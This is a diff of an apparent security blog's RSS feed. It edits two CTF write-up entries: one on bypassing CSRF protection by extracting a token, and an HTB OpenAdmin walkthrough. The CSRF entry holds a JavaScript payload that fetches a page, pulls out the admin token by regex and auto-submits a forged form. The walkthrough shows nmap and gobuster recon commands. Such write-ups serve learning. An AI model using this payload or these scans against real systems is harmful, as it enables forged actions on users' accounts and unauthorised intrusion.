@@ -14,7 +14,7 @@
             
             <guid>https://ajdintrejic.github.io/posts/2020/05/csrf-token-extraction/</guid>
             <description>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.
-&amp;lt;form action=&amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34; method=&amp;#34;post&amp;#34; name=&amp;#34;csrf&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;#34;token&amp;#34; type=&amp;#34;hidden&amp;#34; name=&amp;#34;token&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;http://challenge01.root-me.org/web-client/ch23/?action=profile&amp;#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&amp;#39;token&amp;#39;).setAttribute(&amp;#39;value&amp;#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt; What is this token?</description>
+&amp;lt;form action=&amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34; method=&amp;#34;post&amp;#34; name=&amp;#34;csrf&amp;#34; enctype=&amp;#34;multipart/form-data&amp;#34;&amp;gt; &amp;lt;input ... /&amp;gt; &amp;lt;input id=&amp;#34;token&amp;#34; type=&amp;#34;hidden&amp;#34; name=&amp;#34;token&amp;#34; value=&amp;#34;&amp;#34; /&amp;gt; &amp;lt;button type=&amp;#34;submit&amp;#34;&amp;gt;Submit&amp;lt;/button&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;script&amp;gt; xhttp = new XMLHttpRequest(); xhttp.open(&amp;#34;GET&amp;#34;, &amp;#34;&amp;lt;url goes here&amp;gt;&amp;#34;, false); xhttp.send(); token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/)); document.getElementById(&amp;#39;token&amp;#39;).setAttribute(&amp;#39;value&amp;#39;, token_admin) document.csrf_form.submit(); &amp;lt;/script&amp;gt; What is this token?</description>
             <content type="html"><![CDATA[<p>So I was doing a CTF challenge and I have learned how to bypass CSRF token protection with extracting the token. I had to remove the CSRF code as the CTF forbids leaking solutions.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript">&lt;form action=<span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span> method=<span style="color:#ed9d13">&#34;post&#34;</span> name=<span style="color:#ed9d13">&#34;csrf&#34;</span> enctype=<span style="color:#ed9d13">&#34;multipart/form-data&#34;</span>&gt;
                 &lt;input ... /&gt;
@@ -24,7 +24,7 @@
 
 &lt;script&gt;
                 xhttp = <span style="color:#6ab825;font-weight:bold">new</span> XMLHttpRequest();
-                xhttp.open(<span style="color:#ed9d13">&#34;GET&#34;</span>, <span style="color:#ed9d13">&#34;http://challenge01.root-me.org/web-client/ch23/?action=profile&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
+                xhttp.open(<span style="color:#ed9d13">&#34;GET&#34;</span>, <span style="color:#ed9d13">&#34;&lt;url goes here&gt;&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
                 xhttp.send();
 
                 token_admin = (xhttp.responseText.match(<span style="color:#ed9d13">/[abcdef0123456789]{32}/</span>));
@@ -47,6 +47,10 @@
             <description>Reconnaissance Let&amp;rsquo;s see what have we got here with nmap.
 nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: probe open ports to determine service/version info -O: OS detection -oA: output OS detection, version detection, script scanning, and traceroute Nmap returns the results quick as it by default scans only for most popular 1000 ports, so lets scan all the ports while we investigate the initial nmap scan.</description>
             <content type="html"><![CDATA[<p><img src="/htb-openadmin/info_card.png" alt="info card"></p>
+
+    <img src="/htb-openadmin/info_card.png"  alt="Info Card"  class="center"  style="border-radius: 8px;"  />
+
+
 <h2 id="reconnaissance">Reconnaissance</h2>
 <p>Let&rsquo;s see what have we got here with nmap.</p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -oA nmap/initial 10.10.10.171
@@ -58,8 +62,16 @@ nmap -sC -sV -O -oA nmap/initial 10.10.10.171 -sC: run default script scan -sV: 
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -sC -sV -O -p- -oA nmap/full 10.10.10.171
 </code></pre></div><pre><code>-p-: scans from port 1 to 65535, same as -p1-65535
 </code></pre><p><img src="/htb-openadmin/nmap_initial.png" alt="namp initial"></p>
+
+    <img src="/htb-openadmin/nmap_initial.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
 <p>Let&rsquo;s look at the http server.</p>
 <p><img src="/htb-openadmin/http_server.png" alt="http server"></p>
+
+    <img src="/htb-openadmin/http_server.png"  alt="Hello Friend"  class="center"  style="border-radius: 8px;"  />
+
+
 <p>The page has the default Apache 2 page, so let&rsquo;s fire up gobuster. </p>
 <div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.171 -x php,html -t <span style="color:#3677a9">100</span>
 </code></pre></div><pre><code>-w: use a wordlist
